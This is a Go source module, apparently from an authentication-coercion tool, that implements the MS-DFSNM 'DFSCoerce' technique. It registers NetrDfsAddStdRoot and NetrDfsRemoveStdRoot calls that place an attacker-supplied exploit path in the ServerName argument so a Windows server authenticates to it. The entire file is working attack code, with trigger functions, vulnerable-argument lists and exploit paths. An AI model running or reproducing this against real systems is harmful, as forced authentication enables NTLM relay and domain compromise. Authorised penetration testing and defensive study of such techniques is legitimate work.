package methods

import (
	netdfs "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/4fc742e0-4a10-11cf-8273-00aa004ae673/3.0"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/ndr"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/syntax"
	"github.com/TheManticoreProject/manticore-coercer/utils"
)

// --- Op 12: NetrDfsAddStdRoot ---

type netrDfsAddStdRootRequest struct {
	ServerName ndr.WSTR
	RootShare  ndr.WSTR
	Comment    ndr.WSTR
	ApiFlags   ndr.DWORD
}

func (*netrDfsAddStdRootRequest) Opnum() uint16 { return netdfs.OpnumNetrDfsAddStdRoot }

type netrDfsAddStdRootResponse struct {
	Status ndr.DWORD `ndr:"retval"`
}

// --- Op 13: NetrDfsRemoveStdRoot ---

type netrDfsRemoveStdRootRequest struct {
	ServerName ndr.WSTR
	RootShare  ndr.WSTR
	ApiFlags   ndr.DWORD
}

func (*netrDfsRemoveStdRootRequest) Opnum() uint16 { return netdfs.OpnumNetrDfsRemoveStdRoot }

type netrDfsRemoveStdRootResponse struct {
	Status ndr.DWORD `ndr:"retval"`
}

func dfsnmAccess() []Access {
	syntaxes := []syntax.SyntaxID{netdfs.SyntaxID()}
	return []Access{
		{Transport: TransportNamedPipe, Pipe: netdfs.PipeName, Syntaxes: syntaxes, DefaultAuth: RPCAuthNone, ForbidAuth: true},
	}
}

func registerDFSNM(r *Registry) {
	access := dfsnmAccess()
	paths := smbPathsWithHTTP()

	r.Register(Method{
		Protocol: "MS-DFSNM", ProtocolLong: "Distributed File System Namespace Management",
		Function: "NetrDfsAddStdRoot", Opnum: netdfs.OpnumNetrDfsAddStdRoot,
		VulnerableArgs: []string{"ServerName"}, Access: access, ExploitPaths: paths,
		Trigger: func(rpc ndr.Invoker, target, exploitPath string) TriggerResult {
			req := &netrDfsAddStdRootRequest{
				ServerName: ndr.WSTR(exploitPath),
				RootShare:  ndr.WSTR(utils.RandomString(8)),
				Comment:    ndr.WSTR(utils.RandomString(8)),
				ApiFlags:   0,
			}
			var resp netrDfsAddStdRootResponse
			if err := rpc.Invoke(req, &resp); err != nil {
				return TriggerResult{Faulted: true, Err: err}
			}
			return TriggerResult{Status: uint32(resp.Status)}
		},
	})

	r.Register(Method{
		Protocol: "MS-DFSNM", ProtocolLong: "Distributed File System Namespace Management",
		Function: "NetrDfsRemoveStdRoot", Opnum: netdfs.OpnumNetrDfsRemoveStdRoot,
		VulnerableArgs: []string{"ServerName"}, Access: access, ExploitPaths: paths,
		Trigger: func(rpc ndr.Invoker, target, exploitPath string) TriggerResult {
			req := &netrDfsRemoveStdRootRequest{
				ServerName: ndr.WSTR(exploitPath),
				RootShare:  ndr.WSTR(utils.RandomString(8)),
				ApiFlags:   1,
			}
			var resp netrDfsRemoveStdRootResponse
			if err := rpc.Invoke(req, &resp); err != nil {
				return TriggerResult{Faulted: true, Err: err}
			}
			return TriggerResult{Status: uint32(resp.Status)}
		},
	})
}
